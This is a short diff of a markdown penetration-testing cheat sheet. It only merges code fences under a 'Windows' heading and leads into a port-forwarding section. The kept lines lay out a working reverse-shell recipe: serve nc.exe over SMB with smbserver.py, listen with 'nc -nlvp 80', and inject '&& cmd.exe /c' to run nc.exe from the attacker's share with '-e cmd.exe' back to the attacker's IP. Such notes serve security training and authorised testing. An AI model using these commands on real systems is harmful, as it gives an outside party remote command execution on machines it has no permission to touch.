@@ -40,17 +40,8 @@ smbserver.py -smb2support Share .
 ### Windows
 ````
 locate nc.exe
-````
-
-````
 smbserver.py -smb2support Share .
-````
-
-````
 nc -nlvp 80
-````
-
-````
 && cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
 ````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
